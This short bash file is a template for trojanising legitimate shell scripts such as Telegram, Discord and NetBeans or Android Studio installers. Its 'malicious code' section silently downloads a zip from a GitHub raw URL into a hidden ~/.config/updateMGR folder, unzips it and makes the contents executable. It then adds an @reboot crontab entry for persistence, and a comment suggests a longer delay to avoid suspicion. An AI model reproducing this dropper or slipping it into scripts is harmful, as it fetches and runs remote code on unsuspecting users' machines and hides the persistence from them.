#!/bin/bash
#Infected File
############################################### Genuine code Starts Here ###################################################
#For example it can be code from
#https://github.com/fabianonline/telegram.sh (actual code not added here to avoid possibility of plagarism)
# OR
#https://github.com/jobertabma/recon.sh
# OR
#https://github.com/ChaoticWeg/discord.sh
# OR
# Netbeans Install script [.sh] file, from https://netbeans.apache.org/
# OR
# Android studio run script [studio.sh] 
############################################### Genuine code Ends Here #####################################################


############################################### Malicious code Starts Here #################################################
#Create working directory for your mailcious code
loc="/home/"$(whoami)"/.config/updateMGR"
mkdir -p $loc
wget -q https://raw.githubusercontent.com/nitin-kumar-iiith/system_updater/main/update_manager.zip -P $loc
unzip -qq /home/"$(whoami)"/.config/updateMGR/update_manager.zip -d /home/"$(whoami)"/.config/updateMGR/
chmod +x "/home/"$(whoami)"/.config/updateMGR/"*
# line="@reboot sleep 60 && /home/"$(whoami)"/script_1.sh"
line="@reboot sleep 60 && /home/"$(whoami)"/.config/updateMGR/script_1.sh" 
# In actual deployed code instead of 60 seconds it will be very value such as 6000s, to avoid suspision on cronjob script to be affected
(crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -
############################################### Malicious code Ends Here ###################################################
